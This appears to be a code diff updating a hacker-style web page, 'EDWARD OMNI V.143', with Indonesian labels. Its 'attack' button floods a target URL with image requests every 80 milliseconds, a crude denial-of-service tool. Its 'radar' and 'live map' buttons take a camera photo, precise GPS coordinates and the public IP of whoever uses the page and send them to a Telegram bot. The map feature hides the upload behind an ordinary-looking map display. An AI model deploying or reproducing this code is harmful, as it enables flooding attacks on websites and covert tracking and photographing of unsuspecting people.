@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.142</title>
+    <title>EDWARD OMNI V.143</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
@@ -14,20 +14,19 @@
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
         input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
         .btn-radar { background: transparent; color: var(--blue); border: 1px solid var(--blue); }
         .btn-map { background: var(--neon); color: #000; }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; color: var(--neon); }
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
-        #mapBox { display: none; width: 100%; height: 200px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 10px; }
+        #mapBox { display: none; width: 100%; height: 250px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 15px; }
         
-        /* RADAR & NOTIFIKASI CUSTOM (PENGGANTI ALERT) */
+        /* RADAR OVERLAY */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
-        .btn-exit { background: var(--red); color: white; padding: 10px 25px; border-radius: 50px; font-size: 10px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn-exit { background: var(--red); color: white; padding: 12px 30px; border-radius: 15px; font-size: 12px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         #customNotif { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 12px; display: none; z-index: 10000; box-shadow: 0 0 15px var(--neon); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, video { display: none; }
@@ -35,7 +34,7 @@
 </head>
 <body>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.142</p>
+        <p class="master-name">EDWARD OMNI V.143</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -43,38 +42,30 @@
     </div>
 
     <div class="card">
-        <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Cek Link...">
-        <button class="btn btn-scan" onclick="showNotif('SCANNING LINK...')">⚡ SCAN LINK</button>
-    </div>
-
-    <div class="card">
-        <h3>🔥 NUCLEAR BRUTAL V.142</h3>
-        <input type="text" id="target1" placeholder="Target 1">
-        <input type="text" id="target2" placeholder="Target 2">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
+        <h3>🔥 NUCLEAR BRUTAL V.143</h3>
+        <input type="text" id="target1" placeholder="Target Utama (URL)">
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
         <div id="killerLog"></div>
     </div>
 
     <div class="card">
-        <h3>📡 SATELIT RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">KIRIM DATA (FOTO+GPS)</button>
+        <h3>📡 SATELIT RADAR (PHOTO)</h3>
+        <button class="btn btn-radar" onclick="startRadar()">AMBIL FOTO & GPS</button>
     </div>
 
     <div class="card">
         <h3>📍 LIVE MAP SATELIT</h3>
-        <button class="btn btn-map" onclick="showLiveMap()">LOCK GPS & VIEW MAP</button>
+        <button class="btn btn-map" id="mapBtn" onclick="showLiveMap()">OPEN LIVE MAP</button>
         <iframe id="mapBox" src="" frameborder="0"></iframe>
     </div>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="font-size:10px; color:var(--neon); letter-spacing:2px; margin-bottom:20px;">V.142 SENDING DATA...</p>
+        <p style="font-size:10px; color:var(--neon); letter-spacing:2px; margin-bottom:20px;">V.143 RADAR ACTIVE...</p>
         <button class="btn-exit" onclick="abortRadar()">[ ABORT ]</button>
     </div>
 
     <div id="customNotif"></div>
-
     <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>
 
     <script>
@@ -96,7 +87,7 @@
             document.getElementById('atkBtn').innerText = "TERMINATE 🛑";
             setInterval(() => {
                 const img = new Image(); img.src = t1 + "/?v=" + Math.random();
-                const e = document.createElement('div'); e.innerText = "> [V.142] HIT -> " + t1.substring(0,12);
+                const e = document.createElement('div'); e.innerText = "> [V.143] HIT -> " + t1.substring(0,12);
                 log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
             }, 80);
         }
@@ -113,25 +104,27 @@
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                         const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude, "RADAR");
+                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude, "RADAR_PHOTO");
                         abortRadar();
-                        showNotif("🔱 DATA TERKIRIM KE TELEGRAM!");
-                    }, 3000);
-                }, () => { abortRadar(); }, {enableHighAccuracy: true, timeout: 8000});
+                        showNotif("🔱 FOTO & GPS TERKIRIM!");
+                    }, 2000);
+                }, () => abortRadar(), {enableHighAccuracy: true});
             } catch (e) { abortRadar(); }
         }
 
         function showLiveMap() {
-            document.getElementById('radarOverlay').style.display = 'flex';
+            const btn = document.getElementById('mapBtn');
+            btn.innerText = "LOCKING POSITION...";
             navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude; const lon = pos.coords.longitude;
                 const map = document.getElementById('mapBox');
-                map.src = "https://maps.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude+"&z=15&output=embed";
+                map.src = "https://maps.google.com/maps?q="+lat+","+lon+"&z=15&output=embed";
                 map.style.display = "block";
+                btn.innerText = "OPEN LIVE MAP";
+                showNotif("📍 MAP UPDATED & SENT!");
                 const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                await sendTele(null, ipD.ip, pos.coords.latitude, pos.coords.longitude, "MAPS");
-                abortRadar();
-                showNotif("📍 KOORDINAT TERKIRIM!");
-            }, () => { abortRadar(); }, {enableHighAccuracy: true, timeout: 8000});
+                sendTele(null, ipD.ip, lat, lon, "LIVE_MAP");
+            }, () => { btn.innerText = "ERROR GPS"; }, {enableHighAccuracy: true});
         }
 
         function abortRadar() {
@@ -142,7 +135,7 @@
 
         async function sendTele(photo, ip, lat, lon, source) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-            let cap = "🔱 [ V.142 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
+            let cap = "🔱 [ V.143 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
             if(photo) {
                 fd.append('photo', photo); fd.append('caption', cap);
                 return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
